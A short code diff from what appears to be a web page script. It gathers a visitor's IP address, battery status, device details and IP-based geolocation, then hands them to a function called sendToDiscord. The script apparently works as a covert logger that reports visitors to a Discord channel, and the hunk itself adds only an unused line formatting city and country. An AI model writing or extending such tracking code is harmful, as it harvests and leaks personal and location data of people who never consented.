@@ -116,6 +116,7 @@
             .then(([ip, battery]) => {
                 const deviceInfo = getDeviceInfo();
                 getLocation(ip).then(location => {
+                 const locationInfo = location ? `${location.city}, ${location.country_name}` : 'Unknown';
                     sendToDiscord(ip, location, battery, deviceInfo);
                 });
             });
